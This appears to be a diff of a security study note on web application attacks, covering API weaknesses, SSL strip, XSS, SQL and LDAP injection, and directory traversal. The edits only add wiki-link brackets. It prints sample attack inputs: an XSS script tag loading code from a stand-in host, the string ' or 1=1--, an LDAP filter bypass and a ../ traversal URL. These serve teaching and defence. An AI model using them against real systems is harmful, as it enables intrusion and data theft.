@@ -108,10 +108,10 @@ Web applications and cloud services implement application program interfaces (AP
 
 https://webapp.foo/?Action=RunInstance&Id=123&Count=1&InstanceAccessKey= MyInstanceAccessKey&Placement=us-east&MyAuthorizationToken
 
-If the API isn't secure, threat actors can easily take advantage of it to compromise the services and data stored on the web application. **An API must only be used over an encrypted channel (HTTPS)**. API calls over plain HTTP are not secure and could easily be impersonated or modified by a third party. Some other common attacks against APIs target the following weaknesses and vulnerabilities:
+If the API isn't secure, [[threat actor]]s can easily take advantage of it to compromise the services and data stored on the web application. **An API must only be used over an encrypted channel (HTTPS)**. API calls over plain HTTP are not secure and could easily be impersonated or modified by a third party. Some other common attacks against APIs target the following weaknesses and vulnerabilities:
 
--   **Ineffective secrets management**, allowing threat actors to discover an API key and perform any action authorized to that key.
--   **Lack of input validation,** allowing the threat actor to insert arbitrary parameters into API methods and queries. This is often referred to as allowing unsanitized input.
+-   **Ineffective secrets management**, allowing [[threat actor]]s to discover an API key and perform any action authorized to that key.
+-   **Lack of input validation,** allowing the [[threat actor]] to insert arbitrary parameters into API methods and queries. This is often referred to as allowing unsanitized input.
 -   **Error messages revealing clues to a potential adversary. For example, an authentication error should not reveal whether a valid username has been rejected because of an invalid password. The error should simply indicate an authentication failure.**
 -   Denial of service (DoS) by bombarding the API with spurious calls. Protection against this attack can be provided through throttling/rate-limiting mechanisms.
 # REPLAY ATTACKS 
@@ -145,7 +145,7 @@ Clickjacking is an attack where what the user sees and trusts as a web applicati
 
 ### SSL Strip
 
-A Secure Sockets Layer ([[SSL]]) strip attack is launched against clients on a local network as they try to make connections to websites. The threat actor must first perform a Man-in-the-Middle ([[MITM]]) attack via [[ARP]] poisoning to masquerade as the default gateway. When a client requests an HTTP site that redirects to an HTTPS site in an unsafe way, the sslstrip utility ([https://github.com/moxie0/sslstrip](https://github.com/moxie0/sslstrip)) proxies the request and response, serving the client the HTTP site, hopefully with an unencrypted login form. If the user enters credentials, they will be captured by the threat actor. Sites can use the HTTP Strict Transport Security (HSTS) lists maintained by browsers to prevent clients requesting HTTP in the first place. 
+A Secure Sockets Layer ([[SSL]]) strip attack is launched against clients on a local network as they try to make connections to websites. The [[threat actor]] must first perform a Man-in-the-Middle ([[MITM]]) attack via [[ARP]] poisoning to masquerade as the default gateway. When a client requests an HTTP site that redirects to an HTTPS site in an unsafe way, the sslstrip utility ([https://github.com/moxie0/sslstrip](https://github.com/moxie0/sslstrip)) proxies the request and response, serving the client the HTTP site, hopefully with an unencrypted login form. If the user enters credentials, they will be captured by the [[threat actor]]. Sites can use the HTTP Strict Transport Security (HSTS) lists maintained by browsers to prevent clients requesting HTTP in the first place. 
 
 Play Video
 # CROSS-SITE SCRIPTING 
@@ -158,7 +158,7 @@ Web applications depend on scripting, and most websites these days are web appli
 
 The malicious code could be **used to** deface the trusted site (by adding any sort of arbitrary HTML code), steal data from the user's cookies, try to intercept information entered into a form, perform a request forgery attack, or try to install malware. The crucial point is that the malicious code runs in the client's browser with the same permission level as the trusted site.
 
-An attack where the malicious input comes from a crafted link is a reflected or nonpersistent XSS attack. A stored/persistent XSS attack aims to insert code into a back-end database or content management system used by the trusted site. For example, the attacker may submit a post to a bulletin board with a malicious script embedded in the message. When other users view the message, the malicious script is executed. For example, with no input sanitization, a threat actor could type the following into a new post text field:
+An attack where the malicious input comes from a crafted link is a reflected or nonpersistent XSS attack. A stored/persistent XSS attack aims to insert code into a back-end database or content management system used by the trusted site. For example, the attacker may submit a post to a bulletin board with a malicious script embedded in the message. When other users view the message, the malicious script is executed. For example, with no input sanitization, a [[threat actor]] could type the following into a new post text field:
 
 Check out this amazing <a href="https://trusted.foo">website</a><script src="https://badsite.foo/hook.js"></script>.
 
@@ -183,15 +183,15 @@ A third type of [[XSS]] attack exploits vulnerabilities in client-side scripts. 
 
 Attacks such as session [[replay]], [[CSRF]], and [[DOM]]-based [[XSS]] are [[client-side attacks]]. This means that they execute arbitrary code on the browser. A [[server-side attack]] causes the server to do some processing or run a script or query in a way that is not authorized by the application design. Most server-side attacks depend on some kind of injection attack.
 
-**Where an overflow attack works against the way a process performs memory management**, an **injection attack exploits some unsecure way in which the application processes requests and queries**. For example, an application might allow a user to view his or her profile with a database query that should return the single record for that one user's profile. An application vulnerable to an injection attack might allow a threat actor to return the records for all users, or to change fields in the record when they are only supposed to be able to read them.
+**Where an overflow attack works against the way a process performs memory management**, an **injection attack exploits some unsecure way in which the application processes requests and queries**. For example, an application might allow a user to view his or her profile with a database query that should return the single record for that one user's profile. An application vulnerable to an injection attack might allow a [[threat actor]] to return the records for all users, or to change fields in the record when they are only supposed to be able to read them.
 
-A web application is likely to use Structured Query Language ([[SQL]]) to read and write information from a database. The main database operations are performed by SQL statements for selecting data (SELECT), inserting data (INSERT), deleting data (DELETE), and updating data (UPDATE). In a SQL injection attack, the threat actor modifies one or more of these four basic functions by adding code to some input accepted by the app, causing it to execute the attacker's own set of SQL queries or parameters. If successful, this could allow the attacker to extract or insert information into the database or execute arbitrary code on the remote system using the same privileges as the database application ([owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)).
+A web application is likely to use Structured Query Language ([[SQL]]) to read and write information from a database. The main database operations are performed by SQL statements for selecting data (SELECT), inserting data (INSERT), deleting data (DELETE), and updating data (UPDATE). In a SQL injection attack, the [[threat actor]] modifies one or more of these four basic functions by adding code to some input accepted by the app, causing it to execute the attacker's own set of SQL queries or parameters. If successful, this could allow the attacker to extract or insert information into the database or execute arbitrary code on the remote system using the same privileges as the database application ([owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)).
 
 For example, consider a web form that is supposed to take a name as input. If the user enters "Bob", the application runs the following query:
 
 SELECT * FROM tbl_user WHERE username = 'Bob'
 
-If a threat actor enters the string **' or 1=1--** and this input is not sanitized, the following malicious query will be executed:
+If a [[threat actor]] enters the string **' or 1=1--** and this input is not sanitized, the following malicious query will be executed:
 
 SELECT * FROM tbl_user WHERE username = '' or 1=1--'
 
@@ -214,20 +214,20 @@ This defines an entity named bar that refers to a local file path. A successful 
 
 ### Lightweight Directory Access Protocol (LDAP) Injection
 
-The Lightweight Directory Access Protocol ([[LDAP]]) is another example of a query language. LDAP is specifically used to read and write network directory databases. A threat actor could exploit either unauthenticated access or a vulnerability in a client app to submit arbitrary LDAP queries. This could allow accounts to be created or deleted, or for the attacker to change authorizations and privileges ([owasp.org/www-community/attacks/LDAP_Injection](https://owasp.org/www-community/attacks/LDAP_Injection)).
+The Lightweight Directory Access Protocol ([[LDAP]]) is another example of a query language. LDAP is specifically used to read and write network directory databases. A [[threat actor]] could exploit either unauthenticated access or a vulnerability in a client app to submit arbitrary LDAP queries. This could allow accounts to be created or deleted, or for the attacker to change authorizations and privileges ([owasp.org/www-community/attacks/LDAP_Injection](https://owasp.org/www-community/attacks/LDAP_Injection)).
 
 LDAP filters are constructed from (name=value) attribute pairs delimited by parentheses and the logical operators AND (&) and OR (|). Adding filter parameters as unsanitized input can bypass access controls. For example, if a web form authenticates to an LDAP directory with the valid credentials Bob and Pa$$w0rd, it may construct a query such as this from the user input:
 
 (&(username=Bob)(password=Pa$$w0rd))
 
-Both parameters must be true for the login to be accepted. If the form input is not sanitized, a threat actor could bypass the password check by entering a valid username plus an LDAP filter string, such as **Bob)(&))**. This causes the password filter to be dropped for a condition that is always true:
+Both parameters must be true for the login to be accepted. If the form input is not sanitized, a [[threat actor]] could bypass the password check by entering a valid username plus an LDAP filter string, such as **Bob)(&))**. This causes the password filter to be dropped for a condition that is always true:
 
 (&(username=Bob)(&))
 # DIRECTORY TRAVERSAL AND COMMAND INJECTION ATTACKS 
 
-**Directory traversal** is another type of injection attack performed against a web server. The threat actor submits a request for a file outside the web server's root directory by submitting a path to navigate to the parent directory (../). This attack can succeed if the input is not filtered properly and access permissions on the file are the same as those on the web server directory.
+**Directory traversal** is another type of injection attack performed against a web server. The [[threat actor]] submits a request for a file outside the web server's root directory by submitting a path to navigate to the parent directory (../). This attack can succeed if the input is not filtered properly and access permissions on the file are the same as those on the web server directory.
 
-The [[threat actor]] might use a canonicalization attack to disguise the nature of the malicious input. Canonicalization refers to the way the server converts between the different methods by which a resource (such as a file path or URL) may be represented and submitted to the simplest (or canonical) method used by the server to process the input. Examples of encoding schemes include HTML entities and character set percent encoding (ASCII and Unicode). An attacker might be able to exploit vulnerabilities in the canonicalization process to perform code injection or facilitate directory traversal. For example, to perform a directory traversal attack, the attacker might submit a URL such as:
+The [[[[threat actor]]]] might use a canonicalization attack to disguise the nature of the malicious input. Canonicalization refers to the way the server converts between the different methods by which a resource (such as a file path or URL) may be represented and submitted to the simplest (or canonical) method used by the server to process the input. Examples of encoding schemes include HTML entities and character set percent encoding (ASCII and Unicode). An attacker might be able to exploit vulnerabilities in the canonicalization process to perform code injection or facilitate directory traversal. For example, to perform a directory traversal attack, the attacker might submit a URL such as:
 
 http://victim.foo/?show=../../../../etc/config
 
